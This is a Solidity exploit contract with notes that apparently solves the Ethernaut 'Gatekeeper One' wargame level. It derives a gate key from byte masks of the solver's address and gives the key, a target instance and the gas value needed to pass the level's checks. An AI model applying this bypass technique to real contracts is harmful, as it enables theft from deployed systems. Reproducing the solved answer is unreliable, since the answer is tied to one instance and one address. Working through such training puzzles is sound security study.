// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns(bool);
}


contract GateCrasherOne {
    address payable owner;
    IGatekeeperOne victim;

    constructor(address _victim) {
        victim = IGatekeeperOne(_victim);
        owner = payable(tx.origin);
    }

    function attack(bytes8 _gateKey) public {
        victim.enter(_gateKey);
    }

    function destroy() public {
        selfdestruct(payable(owner));
    }

}



/* One
The right most 2 bytes are the same as the right most 4 bytes
0xABCDEFGHIJKLMNOP
0xMNOP == 0xIJKLMNOP
=> IJKL = 0000
*/

/* Two
The right most 4 bytes are not equal to all the bytes
=> ABCDEFGH != 00000000
*/

/* Three
two rightmost bytes of origin match right four bytes of key
our address = 0x3De7502F63aF4619f8cbffb16EE7cD785f4eb895
=> IJKLMNOP == 0000b895
*/

/*
0x100000000000b895


*/

// instance
// 0x4Ec0Fb443ed58FcEF8b6A759bDa77102C2987A3E

// gas limit:
// 76896

// trick here is to go into geth debugger on etherscan
// get the second gas call down to the right number










